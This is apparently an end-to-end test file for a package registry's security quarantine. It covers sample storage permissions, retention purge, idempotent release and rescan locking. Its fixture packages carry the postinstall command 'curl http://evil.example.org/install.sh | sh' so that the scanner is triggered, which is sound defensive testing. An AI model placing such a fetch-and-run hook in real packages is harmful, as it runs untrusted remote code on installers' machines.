import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { DatabaseSync } from 'node:sqlite';
import request from 'supertest';
import { resetConfigCache } from '../src/config/config';
import { ADMIN, createTestApp, type TestContext } from './app-factory';
import { makeNpmTarball } from './fixtures';

/** 高危安装脚本足以命中 QUARANTINE（见 SECURITY_QUARANTINE_SEVERITY=high） */
const POSTINSTALL = 'curl http://evil.example.org/install.sh | sh';

function publish(ctx: TestContext, name: string, tarball: Buffer) {
  return request(ctx.baseUrl)
    .put(`/npm/${name}`)
    .auth(ADMIN.username, ctx.npmTokens[ADMIN.username])
    .send({
      _id: name,
      name,
      'dist-tags': { latest: '1.0.0' },
      versions: { '1.0.0': { name, version: '1.0.0', dist: {} } },
      _attachments: {
        [`${name}-1.0.0.tgz`]: { data: tarball.toString('base64'), length: tarball.length },
      },
    });
}

function quarantineTarball(name: string) {
  return makeNpmTarball(name, '1.0.0', { scripts: { postinstall: POSTINSTALL } }, { 'index.js': 'module.exports = 1;\n' });
}

function modeOf(target: string): number {
  return fs.statSync(target).mode & 0o777;
}

function onlyChildDir(dir: string): string {
  const entries = fs.readdirSync(dir, { withFileTypes: true }).filter((entry) => entry.isDirectory());
  expect(entries.length).toBe(1);
  return path.join(dir, entries[0].name);
}

function findQuarantineRecord(items: Array<{ id: string; name: string }>, name: string) {
  return items.find((item) => item.name === name);
}

describe('隔离区加固（e2e）', () => {
  let ctx: TestContext;
  let externalDir: string;
  let db: DatabaseSync | null = null;
  const pkg = 'e2e-quarantine-hardened';

  beforeAll(async () => {
    // 独立挂载：把隔离区指向 DATA_DIR 之外的临时目录
    externalDir = fs.mkdtempSync(path.join(os.tmpdir(), 'yuanjian-quarantine-'));
    process.env.QUARANTINE_DIR = externalDir;
    process.env.QUARANTINE_RETENTION_DAYS = '30';
    process.env.QUARANTINE_PURGE_INTERVAL_MS = '0';
    resetConfigCache();
    ctx = await createTestApp('quarantine');

    await publish(ctx, pkg, await quarantineTarball(pkg)).expect(409);
  });

  afterAll(async () => {
    db?.close();
    await ctx.close();
    fs.rmSync(externalDir, { recursive: true, force: true });
    delete process.env.QUARANTINE_DIR;
    delete process.env.QUARANTINE_RETENTION_DAYS;
    delete process.env.QUARANTINE_PURGE_INTERVAL_MS;
    resetConfigCache();
  });

  function openDb(): DatabaseSync {
    db = new DatabaseSync(path.join(ctx.dataDir, 'platform.db'));
    db.exec('PRAGMA busy_timeout=5000;');
    return db;
  }

  it('样本落在独立卷，目录 0700、文件 0600，不写入 DATA_DIR', async () => {
    expect(fs.existsSync(path.join(ctx.dataDir, 'quarantine'))).toBe(false);
    expect(modeOf(externalDir)).toBe(0o700);

    const scanDir = onlyChildDir(externalDir);
    expect(modeOf(scanDir)).toBe(0o700);
    const files = fs.readdirSync(scanDir);
    expect(files.length).toBeGreaterThan(0);
    expect(modeOf(path.join(scanDir, files[0]))).toBe(0o600);
  });

  it('健康检查与指标暴露隔离区概况', async () => {
    const health = await request(ctx.baseUrl).get('/api/v1/health').expect(200);
    expect(health.body.data.quarantine.pending).toBeGreaterThanOrEqual(1);
    expect(health.body.data.quarantine.retentionDays).toBe(30);
    expect(health.body.data.quarantine.dirMode).toBe('0700');
    expect(health.body.data.quarantine.bytes).toBe(0); // 探针不统计占用

    const metrics = await request(ctx.baseUrl).get('/metrics').expect(200);
    expect(metrics.text).toContain('yj_quarantine_pending ');
    expect(metrics.text).toContain('yj_quarantine_expired ');
    expect(metrics.text).toContain('yj_quarantine_bytes ');
    expect(metrics.text).toContain('yj_quarantine_last_purge_timestamp_seconds ');
  });

  it('dry-run 不删文件，超期后才销毁并保留审计记录', async () => {
    const list = await request(ctx.baseUrl)
      .get('/api/v1/security/quarantine')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const record = findQuarantineRecord(list.body.data.items, pkg);
    expect(record).toBeTruthy();

    // 把创建时间改到 40 天前，模拟超期积压
    const old = new Date(Date.now() - 40 * 24 * 60 * 60 * 1000).toISOString();
    const conn = openDb();
    conn.prepare('UPDATE security_scans SET created_at = ? WHERE id = ?').run(old, record!.id);

    const scanDir = path.join(externalDir, record!.id);
    expect(fs.existsSync(scanDir)).toBe(true);

    const dryRun = await request(ctx.baseUrl)
      .post('/api/v1/security/quarantine/purge')
      .auth(ADMIN.username, ADMIN.password)
      .send({})
      .expect(201);
    expect(dryRun.body.data.applied).toBe(false);
    expect(dryRun.body.data.count).toBeGreaterThanOrEqual(1);
    expect(fs.existsSync(scanDir)).toBe(true);

    const applied = await request(ctx.baseUrl)
      .post('/api/v1/security/quarantine/purge')
      .auth(ADMIN.username, ADMIN.password)
      .send({ apply: true })
      .expect(201);
    expect(applied.body.data.applied).toBe(true);
    expect(applied.body.data.ids).toContain(record!.id);

    expect(fs.existsSync(scanDir)).toBe(false);
    const row = conn
      .prepare('SELECT released_at, released_by FROM security_scans WHERE id = ?')
      .get(record!.id) as { released_at: string | null; released_by: string | null };
    expect(row.released_at).toBeTruthy();
    expect(row.released_by).toMatch(/^retention:30d$/);

    const audit = conn
      .prepare("SELECT COUNT(*) AS c FROM audit_logs WHERE action = 'security.quarantine.expire' AND resource_id = ?")
      .get(record!.id) as { c: number };
    expect(Number(audit.c)).toBe(1);
  });

  it('未超期样本不会被自动清理', async () => {
    const fresh = 'e2e-quarantine-fresh';
    await publish(ctx, fresh, await quarantineTarball(fresh)).expect(409);

    const list = await request(ctx.baseUrl)
      .get('/api/v1/security/quarantine')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
    const record = findQuarantineRecord(list.body.data.items, fresh);
    expect(record).toBeTruthy();

    const scanDir = path.join(externalDir, record!.id);
    expect(fs.existsSync(scanDir)).toBe(true);

    const applied = await request(ctx.baseUrl)
      .post('/api/v1/security/quarantine/purge')
      .auth(ADMIN.username, ADMIN.password)
      .send({ apply: true })
      .expect(201);
    expect(applied.body.data.ids).not.toContain(record!.id);
    expect(fs.existsSync(scanDir)).toBe(true);
  });
});

describe('隔离处置幂等与复检互斥（e2e）', () => {
  let ctx: TestContext;
  let externalDir: string;
  let db: DatabaseSync | null = null;

  beforeAll(async () => {
    externalDir = fs.mkdtempSync(path.join(os.tmpdir(), 'yuanjian-quarantine-idem-'));
    process.env.QUARANTINE_DIR = externalDir;
    process.env.QUARANTINE_RETENTION_DAYS = '30';
    process.env.QUARANTINE_PURGE_INTERVAL_MS = '0';
    resetConfigCache();
    ctx = await createTestApp('quarantine-idem');
  });

  afterAll(async () => {
    db?.close();
    await ctx.close();
    fs.rmSync(externalDir, { recursive: true, force: true });
    delete process.env.QUARANTINE_DIR;
    delete process.env.QUARANTINE_RETENTION_DAYS;
    delete process.env.QUARANTINE_PURGE_INTERVAL_MS;
    resetConfigCache();
  });

  function openDb(): DatabaseSync {
    db = new DatabaseSync(path.join(ctx.dataDir, 'platform.db'));
    db.exec('PRAGMA busy_timeout=5000;');
    return db;
  }

  function listQuarantine() {
    return request(ctx.baseUrl)
      .get('/api/v1/security/quarantine')
      .auth(ADMIN.username, ADMIN.password)
      .expect(200);
  }

  it('放行幂等：二次放行返回 already，不重复入库（RV-18）', async () => {
    const pkg = 'e2e-release-idem';
    await publish(ctx, pkg, await quarantineTarball(pkg)).expect(409);

    const list = await listQuarantine();
    const items = list.body.data.items as Array<Record<string, unknown>>;
    const record = items.find((item) => item.name === pkg);
    expect(record).toBeTruthy();
    // RV-17：分组输出携带 versions[]，组内每条隔离记录可独立追溯
    expect(Array.isArray(record!.versions)).toBe(true);
    expect((record!.versions as unknown[]).length).toBeGreaterThanOrEqual(1);
    expect(JSON.stringify(record!.versions)).toContain(pkg);

    const first = await request(ctx.baseUrl)
      .post(`/api/v1/security/quarantine/${record!.id}/release`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(first.body.data.released).toBe(true);
    expect(first.body.data.already).toBeUndefined();

    // 放行后包可正常解析下载
    const packument = await request(ctx.baseUrl).get(`/npm/${pkg}`).expect(200);
    expect(packument.body.versions['1.0.0']).toBeTruthy();

    // 二次放行：幂等返回 already，不再产生新的入库与审计
    const second = await request(ctx.baseUrl)
      .post(`/api/v1/security/quarantine/${record!.id}/release`)
      .auth(ADMIN.username, ADMIN.password)
      .expect(201);
    expect(second.body.data.released).toBe(true);
    expect(second.body.data.already).toBe(true);

    const conn = openDb();
    const releaseCount = conn
      .prepare("SELECT COUNT(*) AS c FROM audit_logs WHERE action = 'security.quarantine.release' AND resource_id = ?")
      .get(String(record!.id)) as { c: number };
    expect(Number(releaseCount.c)).toBe(1);

    // 处置后不再出现在隔离列表
    const list2 = await listQuarantine();
    expect((list2.body.data.items as Array<Record<string, unknown>>).find((item) => item.name === pkg)).toBeUndefined();
  });

  it('批量放行：逐条独立结果，无效 id 报 SEC_NOT_FOUND（RV-17）', async () => {
    const pkgA = 'e2e-release-batch-a';
    const pkgB = 'e2e-release-batch-b';
    await publish(ctx, pkgA, await quarantineTarball(pkgA)).expect(409);
    await publish(ctx, pkgB, await quarantineTarball(pkgB)).expect(409);

    const list = await listQuarantine();
    const items = list.body.data.items as Array<Record<string, unknown>>;
    const idA = items.find((item) => item.name === pkgA)!.id as string;
    const idB = items.find((item) => item.name === pkgB)!.id as string;

    const batch = await request(ctx.baseUrl)
      .post('/api/v1/security/quarantine/release')
      .auth(ADMIN.username, ADMIN.password)
      .send({ ids: [idA, idB, 'not-exist-id'] })
      .expect(201);
    expect(batch.body.data.releasedCount).toBe(2);
    const results = batch.body.data.results as Array<{ id: string; released: boolean; error?: string }>;
    expect(results.find((r) => r.id === idA)?.released).toBe(true);
    expect(results.find((r) => r.id === idB)?.released).toBe(true);
    expect(results.find((r) => r.id === 'not-exist-id')?.error).toBe('SEC_NOT_FOUND');

    await request(ctx.baseUrl)
      .post('/api/v1/security/quarantine/release')
      .auth(ADMIN.username, ADMIN.password)
      .send({ ids: [] })
      .expect(400);
  });

  it('复检互斥：存在 RUNNING 运行记录时 manual 复检返回 409（RV-19）', async () => {
    // 模拟另一进程正在复检：直接落一条 RUNNING 运行记录充当 DB 运行锁
    const conn = openDb();
    conn
      .prepare("INSERT INTO security_rescan_runs (id, trigger, status, started_at) VALUES (?,?,?,?)")
      .run('e2e-running-lock', 'schedule', 'RUNNING', new Date().toISOString());
    try {
      const res = await request(ctx.baseUrl)
        .post('/api/v1/security/rescan')
        .auth(ADMIN.username, ADMIN.password)
        .send({})
        .expect(409);
      expect(res.body.code).toBe('SEC_RESCAN_BUSY');
    } finally {
      conn.prepare("DELETE FROM security_rescan_runs WHERE id = 'e2e-running-lock'").run();
    }
  });
});
